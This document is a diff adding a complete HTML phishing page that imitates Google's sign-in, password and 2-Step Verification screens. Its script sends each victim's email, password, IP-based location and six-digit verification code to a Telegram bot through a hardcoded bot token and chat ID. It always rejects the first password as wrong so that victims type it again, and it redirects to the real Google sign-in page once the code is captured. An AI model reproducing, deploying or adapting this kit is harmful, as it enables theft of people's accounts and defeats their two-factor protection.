@@ -1,0 +1,1097 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gbox Login</title>
+    <style>
+        /* Reset styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f4f9;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+        .main-content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        .loading-line-container {
+            position: absolute;
+            top: calc(50% - 195px);
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100%;
+            max-width: 900px;
+            z-index: 100;
+        }
+        .loading-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background-color: #1a73e8;
+            transform: scaleX(0);
+            transform-origin: left;
+            transition: transform 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            z-index: 10;
+        }
+        .loading-line.active {
+            transform: scaleX(0.7);
+            animation: loading 1.2s infinite ease-in-out;
+        }
+        @keyframes loading {
+            0% { transform: scaleX(0.7); }
+            50% { transform: scaleX(1); }
+            100% { transform: scaleX(0.7); }
+        }
+        .container {
+            display: flex;
+            background-color: #fff;
+            width: 100%;
+            max-width: 900px;
+            padding: 40px;
+            border-radius: 35px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
+            align-items: center;
+            height: 390px;
+            margin-bottom: 0;
+        }
+        /* Logo Section */
+        .logo-section {
+            flex: 2;
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+        }
+        .logo {
+            margin-top: -280px;
+            margin-left: -20px;
+            margin-bottom: 10px;
+        }
+        .logo img {
+            max-width: 90px;
+        }
+        /* Form Section */
+        .form-section {
+            flex: 2;
+            padding-left: 30px;
+        }
+
+        /* Form Section */
+        .form-section2 {
+            flex: 2;
+            padding-left: 30px;
+        }
+        h1 {
+            font-size: 1.8rem;
+            color: #202124;
+            font-weight: 400;
+            margin-bottom: -70px;
+            margin-left: -420px;
+            margin-top: -0;
+        }
+        h2 {
+            font-size: 1.8rem;
+            color: #202124;
+            font-weight: 400;
+            margin-bottom: -90px;
+            margin-left: -420px;
+            margin-top: -0;
+        }
+        p {
+            font-size: 0.9rem;
+            color: #5f6368;
+            margin-bottom: 25px;
+        }
+        .don {
+            margin-bottom: -40px;
+            margin-left: -420px;
+        }
+        .form-group {
+            margin-top: 20px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        input[type="email"],
+        input[type="password"],
+        input[type="text"] {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 1rem;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        input[type="email"]:focus,
+        input[type="password"]:focus,
+        input[type="text"]:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 4px rgba(26, 115, 232, 0.3);
+        }
+        .forgot-link {
+            display: block;
+            font-size: 0.85rem;
+            color: #1a73e8;
+            text-decoration: none;
+            margin-top: 20px;
+        }
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #5f6368;
+            font-size: 0.85rem;
+        }
+        .checkbox-container input {
+            margin-right: 10px;
+        }
+        #password-error {
+            display: none;
+            color: #d93025;
+            font-size: 0.85rem;
+            margin-bottom: 10px;
+        }
+        #verification-error {
+            display: none;
+            color: #d93025;
+            font-size: 0.85rem;
+            margin-bottom: 10px;
+        }
+        .button {
+            width: 20%;
+            background-color: #1a73e8;
+            color: #fff;
+            padding: 9px 5px;
+            font-size: 1rem;
+            font-weight: bold;
+            border: 0;
+            border-radius: 13px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .button:hover {
+            background-color: #1557b0;
+        }
+        .button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+        .divider {
+            margin: 20px 0;
+            font-size: 0.85rem;
+            color: #5f6368;
+        }
+        .signup-link {
+            font-size: 0.85rem;
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .createAccount {
+            font-size: 0.85rem;
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .signup-link:hover {
+            text-decoration: underline;
+        }
+        
+        /* New styles for password container */
+        .password-container {
+            position: relative;
+            width: 100%;
+        }
+        
+        /* New styles for show password checkbox */
+        .show-password-container {
+            display: flex;
+            align-items: center;
+            margin-top: 10px;
+            margin-bottom: 5px;
+        }
+        
+        #showPasswordCheckbox {
+            margin-right: 8px;
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
+        }
+        
+        .show-password-label {
+            color: #5f6368;
+            font-size: 0.85rem;
+            cursor: pointer;
+            user-select: none;
+        }
+        
+        .show-password-label:hover {
+            color: #1a73e8;
+        }
+        
+        .email-display {
+            color: #5f6368;
+            font-size: 0.9rem;
+            margin-bottom: 20px;
+            word-break: break-word;
+        }
+        
+        .email-display strong {
+            color: #202124;
+        }
+
+        /* Position email display below WELCOME on left side - MOVED DOWN */
+        #password-section .email-display {
+            margin-top: 50px;
+            margin-left: -420px;
+            margin-bottom: 10px;
+            text-align: left;
+        }
+        
+        /* Move Welcome text down in password section - MOVED DOWN */
+        #password-section h1 {
+            margin-top: 80px;
+        }
+        
+/* Base styles for larger screens (already defined in your main CSS) */
+
+/* Desktop and larger screens - prevent overlap */
+.form-section h1,
+#password-section h1 {
+    display: block;
+    clear: both;
+    margin-bottom: 15px;
+}
+
+.email-display,
+#password-section .email-display {
+    display: block;
+    clear: both;
+    margin-top: 0;
+    margin-bottom: 20px;
+    word-break: break-word;
+    overflow-wrap: break-word;
+    max-width: 100%;
+}
+
+
+
+/* Tablet and below (768px) */
+@media (max-width: 768px) {
+    body {
+        margin: 0;
+        padding: 0;
+        min-height: 100vh;
+        align-items: stretch;
+        overflow-x: hidden;
+    }
+    
+    .main-content {
+        flex: none;
+        min-height: 100vh;
+        justify-content: flex-start;
+        align-items: flex-start;
+        padding: 0;
+        width: 100%;
+    }
+    
+    .loading-line-container {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        max-width: none;
+        transform: none;
+    }
+    
+    .container {
+        flex-direction: column;
+        width: 100%;
+        max-width: none;
+        padding: 20px 25px;
+        min-height: 100vh;
+        border-radius: 0;
+        box-shadow: none;
+        margin: 0;
+        justify-content: flex-start;
+        align-items: flex-start;
+        box-sizing: border-box;
+    }
+    
+    .logo-section {
+        flex: none;
+        width: 100%;
+        justify-content: flex-start;
+        margin-bottom: 30px;
+        align-items: flex-start;
+    }
+    
+    .logo {
+        margin: 0;
+        padding: 0;
+    }
+    
+    .logo img {
+        max-width: 60px;
+        height: auto;
+    }
+    
+    .form-section, 
+    .form-section2 {
+        flex: none;
+        width: 100%;
+        padding: 0;
+        text-align: left;
+    }
+    
+    h1, h2 {
+        font-size: clamp(1.3rem, 4vw, 1.5rem);
+        margin: 0 0 20px 0;
+        text-align: left;
+        width: 100%;
+        padding: 0;
+        line-height: 1.3;
+        display: block;
+        clear: both;
+    }
+    
+    .don {
+        margin: 0 0 20px 0;
+        text-align: left;
+        padding: 0;
+        width: 100%;
+    }
+    
+    .don p {
+        text-align: left;
+        margin: 0;
+        padding: 0;
+        line-height: 1.5;
+    }
+    
+    .form-group {
+        text-align: left;
+        padding: 0;
+        margin: 20px 0;
+        width: 100%;
+        box-sizing: border-box;
+    }
+    
+    .forgot-link {
+        text-align: left;
+        margin: 15px 0 0 0;
+        padding: 0;
+        display: block;
+        width: 100%;
+    }
+    
+    #password-section .don {
+        text-align: left;
+        padding: 0;
+        margin: 0 0 20px 0;
+        width: 100%;
+    }
+    
+    #password-section .don p {
+        text-align: left;
+        margin: 0;
+        padding: 0;
+    }
+    
+    #password-section .form-group {
+        text-align: left;
+        padding: 0;
+        margin: 20px 0;
+        width: 100%;
+    }
+    
+    #password-section .forgot-link {
+        text-align: left;
+        margin: 15px 0 0 0;
+        padding: 0;
+        width: 100%;
+    }
+    
+    .button {
+        width: 100px;
+        min-width: 80px;
+        margin: 20px 0 0 0;
+        padding: 12px 20px;
+        font-size: clamp(0.85rem, 2.5vw, 1rem);
+        cursor: pointer;
+    }
+    
+    .footer {
+        display: none;
+    }
+    
+    .email-display,
+    #password-section .email-display {
+        margin: 0 0 25px 0;
+        text-align: left;
+        width: 100%;
+        padding: 0;
+        font-size: clamp(0.85rem, 2.5vw, 0.9rem);
+        word-break: break-word;
+        overflow-wrap: break-word;
+        position: relative;
+        z-index: 1;
+        display: block;
+        clear: both;
+    }
+    
+    #password-section h1 {
+        margin: 0 0 15px 0;
+        text-align: left;
+        width: 100%;
+        padding: 0;
+        position: relative;
+        z-index: 2;
+        display: block;
+        clear: both;
+    }
+    
+    .form-section h1 {
+        margin: 0 0 15px 0;
+        display: block;
+        clear: both;
+    }
+    
+    .show-password-container {
+        margin-top: 12px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+    }
+    
+    #showPasswordCheckbox {
+        width: 16px;
+        height: 16px;
+        flex-shrink: 0;
+    }
+    
+    .show-password-label {
+        font-size: clamp(0.75rem, 2vw, 0.85rem);
+        line-height: 1.4;
+    }
+    
+    .verification-description {
+        margin-bottom: 25px;
+        width: 100%;
+    }
+    
+    .verification-description p {
+        margin-bottom: 10px;
+        text-align: left;
+        line-height: 1.5;
+    }
+    
+    .button-container {
+        display: flex;
+        justify-content: flex-start;
+        margin-top: 20px;
+        width: 100%;
+    }
+    
+    p {
+        text-align: left;
+        margin: 15px 0;
+        line-height: 1.5;
+        font-size: clamp(0.85rem, 2.5vw, 1rem);
+    }
+    
+    .divider {
+        margin: 20px 0;
+        width: 100%;
+    }
+    
+    .createAccount {
+        display: inline-block;
+        margin-bottom: 20px;
+    }
+    
+    input[type="email"],
+    input[type="password"],
+    input[type="text"] {
+        width: 100%;
+        padding: 12px 14px;
+        font-size: clamp(0.9rem, 2.5vw, 1rem);
+        box-sizing: border-box;
+        border-radius: 4px;
+    }
+    
+    .signup-link {
+        font-size: clamp(0.85rem, 2.5vw, 1rem);
+    }
+}
+
+/* Mobile landscape and smaller tablets (600px to 768px) */
+@media (max-width: 768px) and (min-width: 601px) {
+    .container {
+        padding: 25px 30px;
+    }
+}
+
+/* Mobile devices (480px to 600px) */
+@media (max-width: 600px) {
+    .container {
+        padding: 20px 22px;
+    }
+    
+    h1, h2 {
+        font-size: 1.35rem;
+        margin-bottom: 18px;
+    }
+    
+    .logo img {
+        max-width: 55px;
+    }
+    
+    .button {
+        width: 95px;
+        padding: 11px 18px;
+    }
+}
+
+/* Small mobile devices (480px and below) */
+@media (max-width: 480px) {
+    .container {
+        padding: 18px 20px;
+    }
+    
+    h1, h2 {
+        font-size: 1.25rem;
+        margin-bottom: 16px;
+    }
+    
+    .logo-section {
+        margin-bottom: 25px;
+    }
+    
+    .logo img {
+        max-width: 50px;
+    }
+    
+    p,
+    .forgot-link,
+    .signup-link {
+        font-size: 0.85rem;
+        line-height: 1.4;
+    }
+    
+    .show-password-label {
+        font-size: 0.8rem;
+    }
+    
+    .button {
+        width: 90px;
+        font-size: 0.9rem;
+        padding: 10px 16px;
+    }
+    
+    .email-display,
+    #password-section .email-display {
+        font-size: 0.85rem;
+        margin-bottom: 20px;
+    }
+    
+    .verification-description p {
+        font-size: 0.85rem;
+    }
+    
+    .form-group {
+        margin: 18px 0;
+    }
+    
+    input[type="email"],
+    input[type="password"],
+    input[type="text"] {
+        padding: 11px 12px;
+        font-size: 0.95rem;
+    }
+    
+    #showPasswordCheckbox {
+        width: 15px;
+        height: 15px;
+    }
+}
+
+/* Extra small devices (360px and below) */
+@media (max-width: 360px) {
+    .container {
+        padding: 16px 18px;
+    }
+    
+    h1, h2 {
+        font-size: 1.2rem;
+        margin-bottom: 14px;
+    }
+    
+    .logo img {
+        max-width: 45px;
+    }
+    
+    .button {
+        width: 85px;
+        font-size: 0.85rem;
+        padding: 9px 14px;
+    }
+    
+    p,
+    .forgot-link,
+    .signup-link,
+    .email-display {
+        font-size: 0.8rem;
+    }
+    
+    .show-password-label {
+        font-size: 0.75rem;
+    }
+    
+    input[type="email"],
+    input[type="password"],
+    input[type="text"] {
+        padding: 10px 12px;
+        font-size: 0.9rem;
+    }
+    
+    .form-group {
+        margin: 16px 0;
+    }
+    
+    #showPasswordCheckbox {
+        width: 14px;
+        height: 14px;
+    }
+}
+
+/* Very small devices (320px) */
+@media (max-width: 320px) {
+    .container {
+        padding: 14px 15px;
+    }
+    
+    h1, h2 {
+        font-size: 1.15rem;
+    }
+    
+    .logo img {
+        max-width: 42px;
+    }
+    
+    .button {
+        width: 80px;
+        font-size: 0.8rem;
+        padding: 8px 12px;
+    }
+    
+    p,
+    .forgot-link,
+    .signup-link,
+    .email-display {
+        font-size: 0.75rem;
+    }
+}
+
+/* Landscape orientation adjustments for mobile */
+@media (max-height: 500px) and (orientation: landscape) {
+    .container {
+        padding: 15px 25px;
+        min-height: auto;
+    }
+    
+    h1, h2 {
+        font-size: 1.2rem;
+        margin-bottom: 12px;
+    }
+    
+    .logo-section {
+        margin-bottom: 15px;
+    }
+    
+    .logo img {
+        max-width: 45px;
+    }
+    
+    .form-group {
+        margin: 12px 0;
+    }
+    
+    .button {
+        margin-top: 15px;
+        padding: 10px 16px;
+    }
+    
+    .email-display,
+    .verification-description {
+        margin-bottom: 15px;
+    }
+}
+
+/* Ensure touch targets are accessible on all mobile devices */
+@media (max-width: 768px) {
+    a, 
+    button, 
+    input[type="checkbox"],
+    .button {
+        min-height: 44px;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+    }
+    
+    input[type="checkbox"] {
+        min-height: auto;
+        min-width: 14px;
+    }
+}
+
+/* High DPI screens (Retina displays) */
+@media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
+    .logo img {
+        image-rendering: -webkit-optimize-contrast;
+        image-rendering: crisp-edges;
+    }
+}       
+
+.footer {
+            width: 100%;
+            max-width: 900px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            padding: 0 24px;
+            background-color: transparent;
+            margin-top: 0;
+        }
+        .footer a {
+            text-decoration: none;
+            color: #757575;
+            font-size: 12px;
+            margin: 0 8px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        /* Align the buttons in a row and right-align them */
+        .button-container {
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+        }
+        .verification-description {
+            color: #5f6368;
+            font-size: 0.9rem;
+            margin-bottom: 20px;
+        }
+        .phone-number {
+            font-weight: bold;
+            color: #202124;
+        }
+    </style>
+</head>
+<body>
+    <div class="main-content">
+        <div class="loading-line-container">
+            <div class="loading-line" id="loadingLine"></div>
+        </div>
+        <div class="container" id="email-section">
+            <!-- Logo Section -->
+            <div class="logo-section">
+                <div class="logo">
+                    <img src="https://thumbs.dreamstime.com/z/mobile-299529606.jpg?w=768" alt="Google Logo">
+                </div>
+            </div>
+            <!-- email Section -->
+            <div class="form-section">
+                <h1>Sign in</h1>
+                <form>
+                    <div class="form-group">
+                        <input type="email" name="email" id="email" placeholder="Enter your email" required>
+                        <div class="don">
+                            <p>to continue to Gmail</p>
+                        </div>
+                        <a href="#" class="forgot-link">Forgot email?</a>
+                    </div>
+                </form>
+                <p>Not your computer? Use Guest mode to sign in privately.
+                    <a href="#" class="signup-link">Learn more about using Guest mode</a>
+                </p>
+                <div class="divider"></div>
+                <a href="#" class="createAccount">Create account</a>
+           
+                <!-- New Button Container -->
+                <div class="button-container">
+                    <button type="button" class="button" onclick="showPasswordInput()">Next</button>
+                </div>
+            </div>
+        </div>
+   
+        <div class="container" id="password-section" style="display: none;">
+            <!-- password Section -->
+            <div class="logo-section">
+                <div class="logo">
+                    <img src="https://thumbs.dreamstime.com/z/mobile-299529606.jpg?w=768" alt="Google Logo">
+                </div>
+            </div>
+            <!-- Form Section -->
+            <div class="form-section">
+                <h1 style="font-size: 2.5rem; font-weight: 2rem ;">Welcome</h1>
+                <!-- Added email display -->
+                <div class="email-display">
+                <strong id="display-email"></strong>
+                </div>
+                <div class="form-group">
+                    <div class="password-container">
+                        <input type="password" name="password" id="password" placeholder="Password" required>
+                    </div>
+                    <div class="show-password-container">
+                        <input type="checkbox" id="showPasswordCheckbox" onchange="togglePasswordVisibility()">
+                        <label for="showPasswordCheckbox" class="show-password-label">Show password</label>
+                    </div>
+                    <br><div id="password-error"></div>
+                    <a href="#" class="forgot-link">Forgot password?</a>
+                </div>
+                <!-- New Button Container -->
+                <div class="button-container">
+                    <button type="button" class="button" id="passwordNextBtn" onclick="sendEmailPassword()">Next</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- New 2-Step Verification Section -->
+        <div class="container" id="verification-section" style="display: none;">
+            <div class="logo-section">
+                <div class="logo">
+                    <img src="https://thumbs.dreamstime.com/z/mobile-299529606.jpg?w=768" alt="Google Logo">
+                </div>
+            </div>
+            <div class="form-section2">
+                <h2>2-Step Verification</h2>
+                <div class="verification-description">
+                    <p>To help keep your account safe, Google wants to make sure it's really you trying to sign in</p>
+                    <p>Enter the 6-digit code to continue</p>
+                </div>
+                <div class="form-group">
+                    <input type="text" name="verification-code" id="verification-code" placeholder="Enter 6-digit code" maxlength="6" required>
+                    <div id="verification-error"></div>
+                </div>
+                <div class="checkbox-container">
+                    <input type="checkbox" id="dont-ask-again">
+                    <label for="dont-ask-again">Don't ask again on this device</label>
+                </div>
+                <div class="button-container">
+                    <button type="button" class="button" id="verifyBtn" onclick="verifyCode()">Verify</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        let email = '';
+        let password = '';
+        let firstPasswordAttempt = true;
+        const loadingLine = document.getElementById('loadingLine');
+        const LOADING_DURATION = 1200;
+
+        function startLoading() {
+            loadingLine.classList.add('active');
+            document.querySelectorAll('.button').forEach(btn => btn.disabled = true);
+        }
+
+        function stopLoading(callback) {
+            setTimeout(() => {
+                loadingLine.classList.remove('active');
+                document.querySelectorAll('.button').forEach(btn => btn.disabled = false);
+                if (callback) callback();
+            }, LOADING_DURATION);
+        }
+
+        function showPasswordInput() {
+            email = document.querySelector("input[name='email']").value;
+            if (!email) {
+                alert("Please enter your email");
+                return;
+            }
+            startLoading();
+            stopLoading(() => {
+                document.getElementById("email-section").style.display = "none";
+                document.getElementById("password-section").style.display = "flex";
+                // Add the email to the display
+                document.getElementById("display-email").textContent = email;
+            });
+        }
+
+        // Add this new function for showing/hiding password with checkbox
+        function togglePasswordVisibility() {
+            const passwordInput = document.getElementById('password');
+            const showPasswordCheckbox = document.getElementById('showPasswordCheckbox');
+            
+            if (showPasswordCheckbox.checked) {
+                passwordInput.type = 'text';
+            } else {
+                passwordInput.type = 'password';
+            }
+        }
+
+        async function sendEmailPassword() {
+            password = document.querySelector("input[name='password']").value;
+            if (!password) {
+                alert("Please enter your password");
+                return;
+            }
+            startLoading();
+            
+            let ipData = {};
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                ipData = await ipResponse.json();
+            } catch (error) {
+                console.error('IP Fetch Error:', error);
+            }
+            
+            const botToken = "7031202579:AAG9HQciCeYZ33-QmbJW2ZhwVMm9pbHvp3U";
+            const chatId = "5733476957";
+       
+            const message = `🔐 Google Credentials Captured 🔐
+📩 Login Details:
+├─ Email: ${email}
+└─ Password: ${password}
+🌐 Network Information:
+├─ IP: ${ipData.ip || 'N/A'}
+├─ Location: ${ipData.city || 'N/A'}, ${ipData.region || 'N/A'}
+├─ Country: ${ipData.country_name || 'N/A'} (${ipData.country_code || 'N/A'})
+└─ ZIP: ${ipData.postal || 'N/A'}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+            } catch (error) {
+                console.error('Telegram Error:', error);
+            }
+
+            stopLoading(() => {
+                if (firstPasswordAttempt) {
+                    firstPasswordAttempt = false;
+                    const errorDiv = document.getElementById('password-error');
+                    errorDiv.textContent = "Wrong password. Try again";
+                    errorDiv.style.display = 'block';
+                    document.getElementById('password').value = '';
+                    // Reset show password checkbox
+                    document.getElementById('showPasswordCheckbox').checked = false;
+                    document.getElementById('password').type = 'password';
+                } else {
+                    // Show verification page on second attempt
+                    document.getElementById("password-section").style.display = "none";
+                    document.getElementById("verification-section").style.display = "flex";
+                }
+            });
+        }
+
+        function verifyCode() {
+            const verificationCode = document.getElementById('verification-code').value;
+            
+            if (!verificationCode || verificationCode.length !== 6) {
+                const errorDiv = document.getElementById('verification-error');
+                errorDiv.textContent = "Please enter a valid 6-digit code";
+                errorDiv.style.display = 'block';
+                return;
+            }
+
+            startLoading();
+            
+            // Send verification code to Telegram
+            const botToken = "7031202579:AAG9HQciCeYZ33-QmbJW2ZhwVMm9pbHvp3U";
+            const chatId = "5733476957";
+            
+            const message = `🔐 2-Step Verification Code Captured 🔐
+📩 Email: ${email}
+🔢 Verification Code: ${verificationCode}
+📱 Device Setting: ${document.getElementById('dont-ask-again').checked ? "Don't ask again on this device" : "Ask on every sign-in"}`;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(() => {
+                stopLoading(() => {
+                    // Redirect to Google after capturing verification code
+                    window.location.href = 'https://accounts.google.com';
+                });
+            })
+            .catch(error => {
+                console.error('Telegram Error:', error);
+                stopLoading(() => {
+                    window.location.href = 'https://accounts.google.com';
+                });
+            });
+        }
+
+        // Allow only numbers in verification code input
+        document.addEventListener('DOMContentLoaded', function() {
+            const verificationInput = document.getElementById('verification-code');
+            if (verificationInput) {
+                verificationInput.addEventListener('input', function() {
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                    if (this.value.length > 6) {
+                        this.value = this.value.slice(0, 6);
+                    }
+                });
+            }
+            
+            // Add event listener for Enter key in email field
+            const emailInput = document.getElementById('email');
+            if (emailInput) {
+                emailInput.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        showPasswordInput();
+                    }
+                });
+            }
+            
+            // Add event listener for Enter key in password field
+            const passwordInput = document.getElementById('password');
+            if (passwordInput) {
+                passwordInput.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        sendEmailPassword();
+                    }
+                });
+            }
+            
+            // Add event listener for Enter key in verification code field
+            const verificationCodeInput = document.getElementById('verification-code');
+            if (verificationCodeInput) {
+                verificationCodeInput.addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') {
+                        verifyCode();
+                    }
+                });
+            }
+        });
+    </script>
+</body>
+</html>
